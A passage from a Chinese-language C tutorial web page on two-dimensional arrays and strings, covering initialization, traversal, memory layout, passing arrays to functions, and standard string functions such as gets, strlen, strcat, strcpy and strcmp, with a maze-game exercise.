</ul>
</li>
</ul>
<hr>
<h2 id="二维数组的初始化"><a href="#二维数组的初始化" class="headerlink" title="二维数组的初始化"></a>二维数组的初始化</h2><ul>
<li>二维数的初始化可分为两种:<ul>
<li>定义的同时初始化</li>
<li>先定义后初始化</li>
</ul>
</li>
<li>定义的同时初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>]=&#123; &#123;<span class="number">80</span>,<span class="number">75</span>,<span class="number">92</span>&#125;, &#123;<span class="number">61</span>,<span class="number">65</span>,<span class="number">71</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>先定义后初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">80</span>;</span><br><span class="line">a[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">75</span>;</span><br><span class="line">a[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">92</span>;</span><br><span class="line">a[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">61</span>;</span><br><span class="line">a[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">65</span>;</span><br><span class="line">a[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">71</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>按行分段赋值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>]=&#123; &#123;<span class="number">80</span>,<span class="number">75</span>,<span class="number">92</span>&#125;, &#123;<span class="number">61</span>,<span class="number">65</span>,<span class="number">71</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>按行连续赋值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>]=&#123; <span class="number">80</span>,<span class="number">75</span>,<span class="number">92</span>,<span class="number">61</span>,<span class="number">65</span>,<span class="number">71</span>&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>其它写法<ul>
<li>完全初始化,可以省略第一维的长度</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[][<span class="number">3</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> a[][<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>部分初始化,可以省略第一维的长度</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[][<span class="number">3</span>]=&#123;&#123;<span class="number">1</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> a[][<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>注意: 有些人可能想不明白，为什么可以省略行数，但不可以省略列数。也有人可能会问，可不可以只指定行数，但是省略列数？其实这个问题很简单，如果我们这样写：<br>int a[2][] = {1, 2, 3, 4, 5, 6}; // 错误写法<br>大家都知道，二维数组会先存放第1行的元素，由于不确定列数，也就是不确定第1行要存放多少个元素，所以这里会产生很多种情况，可能1、2是属于第1行的，也可能1、2、3、4是第一行的，甚至1、2、3、4、5、6全部都是属于第1行的</li>
</ul>
</blockquote>
<ul>
<li>指定元素的初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>]=&#123;[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>]=&#123;[<span class="number">1</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二维数组的应用场景"><a href="#二维数组的应用场景" class="headerlink" title="二维数组的应用场景"></a>二维数组的应用场景</h2><p><img src="/2022/01/15/C/f351a6ed231c8a1a5e6379da6816fd1c.png" alt="img"><br><img src="/2022/01/15/C/dd8a18bdb49031d24c98bc311e80ab78.png" alt="img"><br><img src="/2022/01/15/C/dee64b6cb0f5c043402880d0062d2393.png" alt="img"></p>
<h2 id="二维数组的遍历和存储"><a href="#二维数组的遍历和存储" class="headerlink" title="二维数组的遍历和存储"></a>二维数组的遍历和存储</h2><h2 id="二维数组的遍历"><a href="#二维数组的遍历" class="headerlink" title="二维数组的遍历"></a>二维数组的遍历</h2><ul>
<li>二维数组a[3][4],可分解为三个一维数组,其数组名分别为:<ul>
<li>这三个一维数组都有4个元素,例如:一维数组a[0]的 元素为a[0][0],a[0][1],a[0][2],a[0][3]。</li>
<li>所以遍历二维数组无非就是先取出二维数组中得一维数组, 然后再从一维数组中取出每个元素的值</li>
</ul>
</li>
<li>示例</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> cs[<span class="number">2</span>][<span class="number">3</span>] = &#123;</span><br><span class="line">    &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, cs[<span class="number">0</span>][<span class="number">0</span>]);<span class="comment">// 第一个[0]取出一维数组, 第二个[0]取出一维数组中对应的元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> cs[<span class="number">2</span>][<span class="number">3</span>] = &#123;</span><br><span class="line">    &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123; <span class="comment">// 外循环取出一维数组</span></span><br><span class="line">    <span class="comment">// i</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;<span class="comment">// 内循环取出一维数组的每个元素</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, cs[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意: 必须强调的是,a[0],a[1],a[2]不能当作下标变量使用,它们是数组名,不是一个单纯的下标变量</p>
</blockquote>
<h2 id="二维数组的存储"><a href="#二维数组的存储" class="headerlink" title="二维数组的存储"></a>二维数组的存储</h2><ul>
<li>和以为数组一样<ul>
<li>给数组分配存储空间从内存地址大开始分配</li>
<li>给数组元素分配空间, 从所占用内存地址小的开始分配</li>
<li>往每个元素中存储数据从高地址开始存储</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char cs[2][3] = &#123;</span><br><span class="line">        &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;,</span><br><span class="line">        &#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    // cs == &amp;cs == &amp;cs[0] == &amp;cs[0][0]</span><br><span class="line">    printf(&quot;cs = %p\n&quot;, cs);                // 0060FEAA</span><br><span class="line">    printf(&quot;&amp;cs = %p\n&quot;, &amp;cs);              // 0060FEAA</span><br><span class="line">    printf(&quot;&amp;cs[0] = %p\n&quot;, &amp;cs[0]);        // 0060FEAA</span><br><span class="line">    printf(&quot;&amp;cs[0][0] = %p\n&quot;, &amp;cs[0][0]);  // 0060FEAA</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/b3da2217fbaf93e346a390a47cad9a50.png" alt="img"></p>
<h2 id="二维数组与函数"><a href="#二维数组与函数" class="headerlink" title="二维数组与函数"></a>二维数组与函数</h2><ul>
<li>值传递</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// 和一位数组一样, 只看形参是基本类型还是数组类型</span><br><span class="line">// 如果是基本类型在函数中修改形参不会影响实参</span><br><span class="line">void change(char ch)&#123;</span><br><span class="line">    ch = &#x27;n&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char cs[2][3] = &#123;</span><br><span class="line">        &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;,</span><br><span class="line">        &#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // a</span><br><span class="line">    change(cs[0][0]);</span><br><span class="line">    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // a</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>地址传递</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// 和一位数组一样, 只看形参是基本类型还是数组类型</span><br><span class="line">// 如果是数组类型在函数中修改形参会影响实参</span><br><span class="line">void change(char ch[])&#123;</span><br><span class="line">    ch[0] = &#x27;n&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char cs[2][3] = &#123;</span><br><span class="line">        &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;,</span><br><span class="line">        &#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // a</span><br><span class="line">    change(cs[0]);</span><br><span class="line">    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // n</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// 和一位数组一样, 只看形参是基本类型还是数组类型</span><br><span class="line">// 如果是数组类型在函数中修改形参会影响实参</span><br><span class="line">void change(char ch[][3])&#123;</span><br><span class="line">    ch[0][0] = &#x27;n&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char cs[2][3] = &#123;</span><br><span class="line">        &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;,</span><br><span class="line">        &#123;&#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // a</span><br><span class="line">    change(cs);</span><br><span class="line">    printf(&quot;cs[0][0] = %c\n&quot;, cs[0][0]); // n</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二维数组作为函数参数注意点"><a href="#二维数组作为函数参数注意点" class="headerlink" title="二维数组作为函数参数注意点"></a>二维数组作为函数参数注意点</h2><ul>
<li>形参错误写法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void test(char cs[2][]) // 错误写法</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;我被执行了\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test(char cs[2][3]) // 正确写法</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;我被执行了\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test(char cs[][3]) // 正确写法</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;我被执行了\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>二维数组作为函数参数，在被调函数中不能获得其有多少行，需要通过参数传入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void test(char cs[2][3])</span><br><span class="line">&#123;</span><br><span class="line">    int row = sizeof(cs); // 输出4或8</span><br><span class="line">    printf(&quot;row = %zu\n&quot;, row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>二维数组作为函数参数，在被调函数中可以计算出二维数组有多少列</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void test(char cs[2][3])</span><br><span class="line">&#123;</span><br><span class="line">    size_t col = sizeof(cs[0]); // 输出3</span><br><span class="line">    printf(&quot;col = %zd\n&quot;, col);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul>
<li>玩家通过键盘录入 w,s,a,d控制小人向不同方向移动,其中w代表向上移动,s代表向 下移动,a代表向左移动,d 代表向右移动,当小人移动到出口位置,玩家胜利</li>
<li>思路:</li>
<li>1.定义二维数组存放地图</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">######</span><br><span class="line">#O #</span><br><span class="line"># ## #</span><br><span class="line">#  # #</span><br><span class="line">##   #</span><br><span class="line">######</span><br></pre></td></tr></table></figure>

<p>2.规定地图的方向<br><img src="/2022/01/15/C/7331a7700b09543cef73fa0bbddc3c16.png" alt="img"></p>
<ul>
<li>3.编写程序控制方向<ul>
<li>当输入w或者W, 小人向上移动. x-1</li>
<li>当输入s 或者S, 小人向下. x+1</li>
<li>当输入a或者A, 小人向左. y-1</li>
<li>当输入d或者D, 小人向右. y+1</li>
</ul>
</li>
<li>4.移动小人<ul>
<li>用变量记录小人当前的位置<ul>
<li>1)如果小人将要移动的位置是墙,则无法移动</li>
<li>2)如果小人将要移动的位置是路,则可以移动</li>
</ul>
</li>
</ul>
</li>
<li>5.判断是否走出迷宫</li>
</ul>
<h2 id="字符串的基本概念"><a href="#字符串的基本概念" class="headerlink" title="字符串的基本概念"></a>字符串的基本概念</h2><ul>
<li>字符串是位于双引号中的字符序列<ul>
<li>在内存中以“\0”结束,所占字节比实际多一个<br><img src="/2022/01/15/C/e0f0831ff1b110569a7e34440ab62e9e.png" alt="img"></li>
</ul>
</li>
</ul>
<h2 id="字符串的初始化"><a href="#字符串的初始化" class="headerlink" title="字符串的初始化"></a>字符串的初始化</h2><ul>
<li>在C语言中没有专门的字符串变量,通常用一个字符数组来存放一个字符串。<ul>
<li>当把一个字符串存入一个数组时,会把结束符‘\0’存入数组,并以此作为该字符串是否结束的标志。</li>
<li>有了‘\0’标志后,就不必再用字符数组 的长度来判断字符串的长度了</li>
</ul>
</li>
<li>初始化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char name[9] = &quot;lnj&quot;; //在内存中以“\0”结束， \0ASCII码值是0</span><br><span class="line">char name1[9] = &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;,&#x27;\0&#x27;&#125;;</span><br><span class="line">char name2[9] = &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;,0&#125;;</span><br><span class="line">// 当数组元素个数大于存储字符内容时, 未被初始化的部分默认值是0, 所以下面也可以看做是一个字符串</span><br><span class="line">char name3[9] = &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>错误的初始化方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    //省略元素个数时, 不能省略末尾的\n</span><br><span class="line">    // 不正确地写法，结尾没有\0 ，只是普通的字符数组</span><br><span class="line">    char name4[] = &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;&#125;;</span><br><span class="line"></span><br><span class="line">     //   &quot;中间不能包含\0&quot;, 因为\0是字符串的结束标志</span><br><span class="line">     //    \0的作用：字符串结束的标志</span><br><span class="line">    char name[] = &quot;c\0ool&quot;;</span><br><span class="line">     printf(&quot;name = %s\n&quot;,name);</span><br><span class="line">输出结果: c</span><br></pre></td></tr></table></figure>

<h2 id="字符串输出"><a href="#字符串输出" class="headerlink" title="字符串输出"></a>字符串输出</h2><ul>
<li>如果字符数组中存储的是一个字符串, 那么字符数组的输入输出将变得简单方便。<ul>
<li>不必使用循环语句逐个地输入输出每个字符</li>
<li>可以使用printf函数和scanf函数一次性输出输入一个字符数组中的字符串</li>
</ul>
</li>
<li>使用的格式字符串为“%s”,表示输入、输出的是一个字符串 字符串的输出</li>
</ul>
<hr>
<ul>
<li>输出<ul>
<li>%s的本质就是根据传入的name的地址逐个去取数组中的元素然后输出，直到遇到\0位置</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char chs[] = &quot;lnj&quot;;</span><br><span class="line">printf(&quot;%s\n&quot;, chs);</span><br></pre></td></tr></table></figure>

<ul>
<li>注意点:<ul>
<li>\0引发的脏读问题</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char name[] = &#123;&#x27;c&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;l&#x27; , &#x27;\0&#x27;&#125;;</span><br><span class="line">char name2[] = &#123;&#x27;l&#x27;, &#x27;n&#x27;, &#x27;j&#x27;&#125;;</span><br><span class="line">printf(&quot;name2 = %s\n&quot;, name2); // 输出结果: lnjcool</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>输入</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch[10];</span><br><span class="line">scanf(&quot;%s&quot;,ch);</span><br></pre></td></tr></table></figure>

<ul>
<li>注意点:<ul>
<li>对一个字符串数组, 如果不做初始化赋值, 必须指定数组长度</li>
<li>ch最多存放由9个字符构成的字符串，其中最后一个字符的位置要留给字符串的结尾标示‘\0’</li>
<li>当用scanf函数输入字符串时,字符串中不能含有空格,否则将以空格作为串的结束符</li>
</ul>
</li>
</ul>
<hr>
<h2 id="字符串常用方法"><a href="#字符串常用方法" class="headerlink" title="字符串常用方法"></a>字符串常用方法</h2><ul>
<li>C语言中供了丰富的字符串处理函数,大致可分为字符串的输入、输出、合并、修改、比较、转 换、复制、搜索几类。<ul>
<li>使用这些函数可大大减轻编程的负担。</li>
<li>使用输入输出的字符串函数,在使用前应包含头文件”stdio.h”</li>
<li>使用其它字符串函数则应包含头文件”string.h”</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>字符串输出函数:puts<ul>
<li>格式: puts(字符数组名)</li>
<li>功能:把字符数组中的字符串输出到显示器。即在屏幕上显示该字符串。</li>
</ul>
</li>
<li>优点:<ul>
<li>自动换行</li>
<li>可以是数组的任意元素地址</li>
</ul>
</li>
<li>缺点<ul>
<li>不能自定义输出格式, 例如 puts(“hello %i”);</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> ch[] = <span class="string">&quot;lnj&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(ch); <span class="comment">//输出结果: lnj</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>puts函数完全可以由printf函数取代。当需要按一定格式输出时,通常使用printf函数</li>
</ul>
</blockquote>
<ul>
<li>字符串输入函数:gets<ul>
<li>格式: gets (字符数组名)</li>
<li>功能:从标准输入设备键盘上输入一个字符串。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> ch[<span class="number">30</span>];</span><br><span class="line">gets(ch); <span class="comment">// 输入:lnj</span></span><br><span class="line"><span class="built_in">puts</span>(ch); <span class="comment">// 输出:lnj</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>可以看出当输入的字符串中含有空格时,输出仍为全部字符串。说明gets函数并不以空格作为字符串输入结束的标志,而只以回车作为输入结束。这是与scanf函数不同的。</li>
<li>注意gets很容易导致数组下标越界，是一个不安全的字符串操作函数</li>
</ul>
</blockquote>
<ul>
<li>字符串长度</li>
<li>利用sizeof字符串长度<ul>
<li>因为字符串在内存中是逐个字符存储的,一个字符占用一个字节,所以字符串的结束符长度也是占用的内存单元的字节数。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;it666&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> size = <span class="keyword">sizeof</span>(name);<span class="comment">// 包含\0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size = %d\n&quot;</span>, size); <span class="comment">//输出结果:6</span></span><br></pre></td></tr></table></figure>

<ul>
<li>利用系统函数<ul>
<li>格式: strlen(字符数组名)</li>
<li>功能:测字符串的实际长度(不含字符串结束标志‘\0’)并作为函数返回值。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;it666&quot;</span>;</span><br><span class="line"><span class="keyword">size_t</span> len = <span class="built_in">strlen</span>(name2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;len = %lu\n&quot;</span>, len); <span class="comment">//输出结果:5</span></span><br></pre></td></tr></table></figure>

<ul>
<li>以“\0”为字符串结束条件进行统计</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  自定义方法计算字符串的长度</span></span><br><span class="line"><span class="comment"> *  @param name 需要计算的字符串</span></span><br><span class="line"><span class="comment"> *  @return 不包含\0的长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myStrlen2</span><span class="params">(<span class="keyword">char</span> str[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//    1.定义变量保存字符串的长度</span></span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (str[length] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        length++;<span class="comment">//1 2 3 4</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  自定义方法计算字符串的长度</span></span><br><span class="line"><span class="comment"> *  @param name  需要计算的字符串</span></span><br><span class="line"><span class="comment"> *  @param count 字符串的总长度</span></span><br><span class="line"><span class="comment"> *  @return 不包含\0的长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myStrlen</span><span class="params">(<span class="keyword">char</span> str[], <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//    1.定义变量保存字符串的长度</span></span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//    2.通过遍历取出字符串中的所有字符逐个比较</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line"><span class="comment">//        3.判断是否是字符串结尾</span></span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> length;</span><br><span class="line">        &#125;</span><br><span class="line">        length++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>字符串连接函数:strcat<ul>
<li>格式: strcat(字符数组名1,字符数组名2)</li>
<li>功能:把字符数组2中的字符串连接到字符数组1 中字符串的后面,并删去字符串1后的串标志 “\0”。本函数返回值是字符数组1的首地址。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> oldStr[<span class="number">100</span>] = <span class="string">&quot;welcome to&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> newStr[<span class="number">20</span>] = <span class="string">&quot; lnj&quot;</span>;</span><br><span class="line"><span class="built_in">strcat</span>(oldStr, newStr);</span><br><span class="line"><span class="built_in">puts</span>(oldStr); <span class="comment">//输出: welcome to lnj&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>本程序把初始化赋值的字符数组与动态赋值的字符串连接起来。要注意的是,字符数组1应定义足 够的长度,否则不能全部装入被连接的字符串。</li>
</ul>
</blockquote>
<ul>
<li>字符串拷贝函数:strcpy<br><code>- 格式: strcpy(字符数组名1,字符数组名2)</code>- 功能:把字符数组2中的字符串拷贝到字符数组1中。串结束标志“\0”也一同拷贝。字符数名2, 也可以是一个字符串常量。这时相当于把一个字符串赋予一个字符数组。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> oldStr[<span class="number">100</span>] = <span class="string">&quot;welcome to&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> newStr[<span class="number">50</span>] = <span class="string">&quot; lnj&quot;</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(oldStr, newStr);</span><br><span class="line"><span class="built_in">puts</span>(oldStr); <span class="comment">// 输出结果:  lnj // 原有数据会被覆盖</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>本函数要求字符数组1应有足够的长度,否则不能全部装入所拷贝的字符串。</li>
</ul>
</blockquote>
<hr>
<ul>
<li>字符串比较函数:strcmp<ul>
<li>格式: strcmp(字符数组名1,字符数组名2)</li>
<li>功能:按照ASCII码顺序比较两个数组中的字符串,并由函数返回值返回比较结果。<ul>
<li>字符串1=字符串2,返回值=0;</li>
<li>字符串1&gt;字符串2,返回值&gt;0;</li>
<li>字符串1&lt;字符串2,返回值&lt;0。</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> oldStr[<span class="number">100</span>] = <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> newStr[<span class="number">50</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">strcmp</span>(oldStr, newStr)); <span class="comment">//输出结果:-1</span></span><br><span class="line"><span class="keyword">char</span> oldStr[<span class="number">100</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> newStr[<span class="number">50</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">strcmp</span>(oldStr, newStr));  <span class="comment">//输出结果:0</span></span><br><span class="line"><span class="keyword">char</span> oldStr[<span class="number">100</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> newStr[<span class="number">50</span>] = <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">strcmp</span>(oldStr, newStr)); <span class="comment">//输出结果:1</span></span><br></pre></td></tr></table></figure>

<h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><ul>
<li>编写一个函数char_contains(char str[],char key)， 如果字符串str中包含字符key则返回数值1，否则返回数值0</li>
</ul>
<h2 id="字符串数组基本概念"><a href="#字符串数组基本概念" class="headerlink" title="字符串数组基本概念"></a>字符串数组基本概念</h2><ul>
<li>字符串数组其实就是定义一个数组保存所有的字符串<ul>
<li>1.一维字符数组中存放一个字符串，比如一个名字char name[20] = “nj”</li>
<li>2.如果要存储多个字符串，比如一个班所有学生的名字，则需要二维字符数组，char names[15][20]可以存放15个学生的姓名(假设姓名不超过20字符)</li>
<li>如果要存储两个班的学生姓名，那么可以用三维字符数组char names[2][15][20]<br>##字符串数组的初始化</li>
</ul>
</li>
</ul>
